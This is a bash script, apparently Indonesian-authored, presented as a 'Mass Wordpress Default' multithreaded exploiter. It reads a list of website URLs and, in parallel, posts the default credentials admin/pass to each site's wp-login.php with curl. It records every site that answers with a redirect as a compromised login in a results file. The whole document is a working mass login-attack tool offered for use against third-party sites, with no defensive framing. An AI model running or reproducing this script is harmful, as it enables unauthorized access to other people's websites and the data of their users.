#Simple Default Wordpress Login
#Multithreads Exploiter
#Default U/P Login Wordpress
#Jevil36239
#exploit Login admin / pass
#Finished by 22/Octo/2021 00:21

clear
echo "
          _________________(- Mass Wordpress Default -)_________________
                       ____________________________________   
                               ____________________               
"
echo ""
echo ""
read -p "Masukan List : " url;
read -p "Threads ( Default 10 ) : " thread;
 
 #execution
 buset (){
 ngecurl=$(curl --connect-timeout 10 --max-time 10 -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${site}/wp-login.php" --data "log=admin&pwd=pass&wp-submit=Log+In" --compressed)
 status=$(echo ${ngecurl} | grep 'HTTP_STATUS_CODE_X' | awk '{print $2}')
 if [[ $status =~ "302" ]]; then
  echo -e "-$2/$cekbaris- (-Y-) $site/wp-login.php#[ admin / pass ]\n" | tee -a resultwordpres.txt
 elif [[ ! -z $(echo ${ngecurl} | grep login_error | grep div) ]];
  then
    echo -ne "-$2/$cekbaris- (-T-) $site\n"
  else
    echo -ne "-$2/$cekbaris- (-T-) $site\n"
  fi
 }

#making default input if threads empty
if [[ $thread="" ]]; then
  thread=10;
fi

#wakawkaowakwoekaoa
n=1
IFS=$'\r\n'
for site in $(cat $url); do
  f=$(expr $n % $thread)
  cekbaris=$(cat $url | wc -l)
  buset $site $n &
  n=$[$n+1]
  done
